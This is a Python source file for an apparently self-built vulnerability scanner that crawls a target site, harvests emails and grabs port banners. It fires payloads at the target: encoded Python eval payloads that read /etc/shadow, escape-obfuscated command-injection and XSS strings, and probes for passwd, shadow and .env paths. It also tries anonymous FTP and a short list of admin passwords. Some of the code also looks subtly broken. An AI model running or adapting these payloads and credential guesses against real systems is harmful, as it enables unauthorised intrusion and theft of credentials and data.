import io
import re
import time
import urllib.parse
import socket
import sys
from ftplib import FTP, FTP_TLS
from urllib.parse import *
import TheSilent.dolphin_scanner as dolphin_scanner
import TheSilent.kitten_crawler as kitten_crawler
import TheSilent.puppy_requests as puppy_requests
from TheSilent.clear import clear
from TheSilent.return_user_agent import return_user_agent

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

init_mal_command = ["ping -c 60 127.0.0.1"]

init_mal_dir = ["1.git",
                "1.php",
                "admin",
                "bin/bash",
                "admin",
                ".env",
                "etc/passwd",
                "etc/shadow",
                "global.asa",
                "login.php"]

init_mal_python = [r"eval(compile('import os\nos.system(\'cat /etc/shadow\')', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\nos.system(base64.b64decode(b\'Y2F0IC9ldGMvc2hhZG93\'))', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\nos.system(base64.b32decode(b\'MNQXIIBPMV2GGL3TNBQWI33X\'))', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\nos.system(base64.b16decode(b\'636174202F6574632F736861646F77\'))', 'melon', 'exec'))",
                   r"eval(compile('import os\ndef melon():\n    data = open(\'/etc/shadow\',\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b64decode(b\'L2V0Yy9zaGFkb3c=\'),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b32decode(b\'F5SXIYZPONUGCZDPO4======\'),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b16decode(b\'2F6574632F736861646F77\'),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))"]

init_mal_xss = ["<i>melon</i>",
                "<iframe>melon</iframe>",
                "<p>melon</p>",
                "<script>alert('melon')</script>",
                "<script>prompt('melon')</script>",
                "<strong>melon</strong>",
                "<title>melon</title>",]

mal_dir = init_mal_dir[:]
for mal in init_mal_dir:
    evade = ""
    for char in mal:
        evade += "\\" + char
    mal_dir.append(evade)

mal_command = init_mal_command[:]
for mal in mal_command:
    evade = ""
    for char in mal:
        evade += "\\" + char
    init_mal_command.append(evade)
for mal in init_mal_command:
    mal_command.append(io.BytesIO(mal.encode()))
    mal_command.append(io.BytesIO(mal.encode() + b" #.apk"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.bat"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.csv"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.gif"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.jpeg"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.jpg"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.log"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.m4a"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.mkv"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.mp3"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.mp4"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.pdf"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.png"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.ps1"))
    mal_command.append(io.BytesIO(mal.encode() + b" #.sh"))

mal_python = init_mal_python[:]
for mal in mal_python:
    evade = ""
    for char in mal:
        evade += "\\" + char
    init_mal_python.append(evade)
for mal in init_mal_python:
    mal_python.append(io.BytesIO(mal.encode()))
    mal_python.append(io.BytesIO(mal.encode() + b" #.apk"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.bat"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.csv"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.gif"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.jpeg"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.jpg"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.log"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.m4a"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.mkv"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.mp3"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.mp4"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.pdf"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.png"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.ps1"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.sh"))

mal_xss = init_mal_xss[:]
for mal in mal_xss:
    evade = ""
    for char in mal:
        evade += "\\" + char
    init_mal_xss.append(evade)
for mal in init_mal_xss:
    mal_xss.append(io.BytesIO(mal.encode()))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.apk"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.bat"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.csv"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.gif"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.jpeg"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.jpg"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.log"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.m4a"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.mkv"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.mp3"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.mp4"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.pdf"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.png"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.ps1"))
    mal_xss.append(io.BytesIO(mal.encode() + b" #.sh"))

form_headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Encoding":"deflate",
                "Accept-Language":"en-US,en;q=0.5",
                "Content-Type":"application/x-www-form-urlencoded",
                "User-Agent":return_user_agent(),
                "UPGRADE-INSECURE-REQUESTS":"1"}

def melon_scanner(init_host,delay=0):
    print(CYAN + "")
    clear()
    hits = []

    print(CYAN + f"enumerating {init_host}")
    host_list = kitten_crawler.kitten_crawler(init_host)
    for host in host_list:
        print(CYAN + f"scanning for interesting things on {host}")
        try:
            time.sleep(delay)
            data = puppy_requests.text(host)
            emails = re.findall("[\w\.]{3,}@[\w\.]{3,}",data)
            for email in emails:
                hits.append(email)

        except:
            pass

    ports = []
    banners = dolphin_scanner.dolphin_scanner(urllib.parse.urlparse(init_host).netloc,True)
    for banner in banners:
        hits.append(banner)
        ports.append(re.findall(":(\d+)-",banner)[0])

    print(CYAN + f"scanning ports for vulnerabilities on {urllib.parse.urlparse(init_host).netloc}")
    for port in ports:
        try:
            time.sleep(delay)
            my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            my_socket.settimeout(10)
            my_socket.connect((urllib.parse.urlparse(init_host).netloc,port))
            for mal in mal_command:
                time.sleep(delay)
                my_socket.send(mal.encode())
                data = my_socket.recv(65536)
                if len(data) > 0:
                    hits.append(f"{urllib.parse.urlparse(init_host).netloc}:{port}- {data} ({mal})")

            for mal in mal_python:
                time.sleep(delay)
                my_socket.send(mal.encode())
                data = my_socket.recv(65536)
                if len(data) > 0:
                    hits.append(f"{urllib.parse.urlparse(init_host).netloc}:{port}- {data} ({mal})")

            my_socket.close()

        except:
            pass

    for host in host_list:
        print(CYAN + f"scanning for vulnerabilities on {host}")
        time.sleep(delay)
        # format host string
        if host.count("/") == 2:
            new_host = host + "/"

        else:
            new_host = host

        try:
            original_page = puppy_requests.text(host)
            all_forms = re.findall("<form[\S\s\n]+/form>", original_page)

        except:
            pass

        # check for directory traversal
        print(CYAN + "checking for directory traversal")
        all_dir = False
        try:
            data = puppy_requests.status_code(host + "/melon-scanner")
            if data == 200:
                all_dir = True

        except:
            pass

        if not all_dir:
            for mal in mal_dir:
                time.sleep(delay)
                try:
                    data = puppy_requests.status_code(new_host + mal)
                    if data == 200:
                        hits.append(f"found ({host}): {mal} page")

                except:
                    pass

        # check for command injection
        print(CYAN + "checking for command injection")
        for mal in mal_command:
            time.sleep(delay)
            try:
                start = time.time()
                data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal),timeout=120)
                end = time.time()
                if end - start >= 55:
                    hits.append(f"command injection in url ({host}): {mal}")

            except:
                pass

            try:
                start = time.time()
                data = puppy_requests.text(host, params={mal:mal},timeout=120)
                end = time.time()
                if end - start >= 55:
                    hits.append(f"command injection in header ({host}): {mal}")

            except:
                pass

            try:
                start = time.time()
                data = puppy_requests.text(host, params={"Cookie":mal},timeout=120)
                end = time.time()
                if end - start >= 55:
                    hits.append(f"command injection in cookie ({host}): {mal}")

            except:
                pass

            try:
                start = time.time()
                data = puppy_requests.text(host, method=mal.upper(),timeout=120)
                end = time.time()
                if end - start >= 55:
                    hits.append(f"command injection in method ({host}): {mal}")

            except:
                pass

            try:
                if len(all_forms) > 0:
                    for form in all_forms:
                        time.sleep(delay)
                        action_bool = True
                        form_names = []
                        mal_value = []
                        form_method = re.findall("method\s?=\s?[\"\'](\S+)[\"\']", form)[0]
                        form_input = re.findall("<input.+>", form)
                        for field in form_input:
                            form_name = re.findall("name\s?=\s?[\"\'](\S+)[\"\']", field)[0]
                            form_type = re.findall("type\s?=\s?[\"\'](\S+)[\"\']", field)[0]
                            form_names.append(form_name)
                            if form_type.lower() == "button" or form_type.lower() == "hidden"  or form_type.lower() == "submit":
                                mal_value.append(re.findall("value\s?=\s?[\"\'](\S+)[\"\']", field)[0])

                            else:
                                mal_value.append(mal)

                        try:
                            action_tag = re.findall("action\s?=\s?[\"\'](\S+)[\"\']", form)[0]
                            if action_tag.startswith("https://") or action_tag.startswith("http://"):
                                action = action_tag

                            if action_tag.startswith("/"):
                                action = host + action_tag

                            else:
                                action = urllib.parse.urlparse(host).scheme + "://" + urllib.parse.urlparse(host).netloc + "/" + action_tag

                        except IndexError:
                            action_bool = False

                        if action_bool:
                            start = time.time()
                            data = puppy_requests.text(action,method=form_method.upper(),params=dict(zip(form_names,mal_value)),headers=form_headers,timeout=120)
                            end = time.time()
                            if end - start >= 55:
                                hits.append(f"command injection in forms ({action}): {dict(zip(form_names,mal_value))}")

                        else:
                            start = time.time()
                            data = puppy_requests.text(host,method=form_method.upper(),params=dict(zip(form_names,mal_value)),headers=form_headers,timeout=120)
                            end = time.time()
                            if end - start >= 55:
                                hits.append(f"command injection in forms ({host})- {dict(zip(form_names,mal_value))}")

            except:
                pass

        # check for python injection
        print(CYAN + "checking for python injection")
        for mal in mal_python:
            time.sleep(delay)
            try:
                data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal))
                if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                    hits.append(f"python injection in url ({host}): {mal}")

            except:
                pass

            try:
                data = puppy_requests.text(host, params={mal:mal})
                if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                    hits.append(f"python injection in header ({host}): {mal}")

            except:
                pass

            try:
                data = puppy_requests.text(host, params={"Cookie":mal})
                if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                    hits.append(f"python injection in cookie ({host}): {mal}")

            except:
                pass

            try:
                data = puppy_requests.text(host, method=mal.upper())
                if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                    hits.append(f"python injection in method ({host}): {mal}")

            except:
                pass

            try:
                if len(all_forms) > 0:
                    for form in all_forms:
                        time.sleep(delay)
                        action_bool = True
                        form_names = []
                        mal_value = []
                        form_method = re.findall("method\s?=\s?[\"\'](\S+)[\"\']", form)[0]
                        form_input = re.findall("<input.+>", form)
                        for field in form_input:
                            form_name = re.findall("name\s?=\s?[\"\'](\S+)[\"\']", field)[0]
                            form_type = re.findall("type\s?=\s?[\"\'](\S+)[\"\']", field)[0]
                            form_names.append(form_name)
                            if form_type.lower() == "button" or form_type.lower() == "hidden"  or form_type.lower() == "submit":
                                mal_value.append(re.findall("value\s?=\s?[\"\'](\S+)[\"\']", field)[0])

                            else:
                                mal_value.append(mal)

                        try:
                            action_tag = re.findall("action\s?=\s?[\"\'](\S+)[\"\']", form)[0]
                            if action_tag.startswith("https://") or action_tag.startswith("http://"):
                                action = action_tag

                            if action_tag.startswith("/"):
                                action = host + action_tag

                            else:
                                action = urllib.parse.urlparse(host).scheme + "://" + urllib.parse.urlparse(host).netloc + "/" + action_tag

                        except IndexError:
                            action_bool = False

                        if action_bool:
                            data = puppy_requests.text(action,method=form_method.upper(),params=dict(zip(form_names,mal_value)),headers=form_headers)
                            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                                hits.append(f"python injection in forms ({action}): {dict(zip(form_names,mal_value))}")

                        else:
                            data = puppy_requests.text(host,method=form_method.upper(),params=dict(zip(form_names,mal_value)),headers=form_headers)
                            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                                hits.append(f"python injection in forms ({host})- {dict(zip(form_names,mal_value))}")

            except:
                pass

        # check for xss
        print(CYAN + "checking for xss")
        for mal in mal_xss:
            time.sleep(delay)
            try:
                data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal))
                if mal in data:
                    hits.append(f"xss in url ({host}): {mal}")

            except:
                pass

            try:
                data = puppy_requests.text(host, params={mal:mal})
                if mal in data:
                    hits.append(f"xss in header ({host}): {mal}")

            except:
                pass

            try:
                data = puppy_requests.text(host, params={"Cookie":mal})
                if mal in data:
                    hits.append(f"xss in cookie ({host}): {mal}")

            except:
                pass

            try:
                data = puppy_requests.text(host, method=mal.upper())
                if mal in data:
                    hits.append(f"xss in method ({host}): {mal}")

            except:
                pass

            try:
                if len(all_forms) > 0:
                    for form in all_forms:
                        time.sleep(delay)
                        action_bool = True
                        form_names = []
                        mal_value = []
                        form_method = re.findall("method\s?=\s?[\"\'](\S+)[\"\']", form)[0]
                        form_input = re.findall("<input.+>", form)
                        for field in form_input:
                            form_name = re.findall("name\s?=\s?[\"\'](\S+)[\"\']", field)[0]
                            form_type = re.findall("type\s?=\s?[\"\'](\S+)[\"\']", field)[0]
                            form_names.append(form_name)
                            if form_type.lower() == "button" or form_type.lower() == "hidden"  or form_type.lower() == "submit":
                                mal_value.append(re.findall("value\s?=\s?[\"\'](\S+)[\"\']", field)[0])

                            else:
                                mal_value.append(mal)

                        try:
                            action_tag = re.findall("action\s?=\s?[\"\'](\S+)[\"\']", form)[0]
                            if action_tag.startswith("https://") or action_tag.startswith("http://"):
                                action = action_tag

                            if action_tag.startswith("/"):
                                action = host + action_tag

                            else:
                                action = urllib.parse.urlparse(host).scheme + "://" + urllib.parse.urlparse(host).netloc + "/" + action_tag

                        except IndexError:
                            action_bool = False

                        if action_bool:
                            data = puppy_requests.text(action,method=form_method.upper(),params=dict(zip(form_names,mal_value)),headers=form_headers)
                            if mal in data:
                                hits.append(f"xss in forms ({action}): {dict(zip(form_names,mal_value))}")

                        else:
                            data = puppy_requests.text(host,method=form_method.upper(),params=dict(zip(form_names,mal_value)),headers=form_headers)
                            if mal in data:
                                hits.append(f"xss in forms ({host})- {dict(zip(form_names,mal_value))}")

            except:
                pass

        # check for anonymous ftp binding
        print(CYAN + "checking ftp")
        ftp_host = host.replace("https://", "")
        ftp_host = ftp_host.replace("http", "")
        ftp_host = ftp_host.replace("/", "")

        try:
            time.sleep(delay)
            ftp = FTP(ftp_host, timeout=5)
            ftp.login()
            ftp.quit()
            hits.append(f"anonymous ftp login allowed ({host})")

        except:
            pass

        try:
            time.sleep(delay)
            ftp = FTP_TLS(ftp_host, timeout=5)
            ftp.login()
            ftp.quit()
            hits.append(f"anonymous secure ftp login allowed ({host})")

        except:
            pass

        # check for weak ftp credentials
        password_list = ["","admin","password","1234","0000","123456","12345678","000000","00000000"]
        for password in password_list:
            time.sleep(delay)
            try:
                ftp = FTP(ftp_host, timeout=5)
                ftp.login("admin",password)
                ftp.quit()
                hits.append(f"ftp weak credentials allowed- admin:{password} ({host})")
                break

            except:
                continue

        for password in password_list:
            time.sleep(delay)
            try:
                ftp = FTP_TLS(ftp_host, timeout=5)
                ftp.login("admin",password)
                ftp.quit()
                hits.append(f"secure ftp weak credentials allowed- admin:{password} ({host})")
                break

            except:
                continue

    hits = list(set(hits[:]))
    hits.sort()
    clear()
    if len(hits) > 0:
        for hit in hits:
            print(RED + hit)

    else:
        print(GREEN + "we didn't find anything interesting")
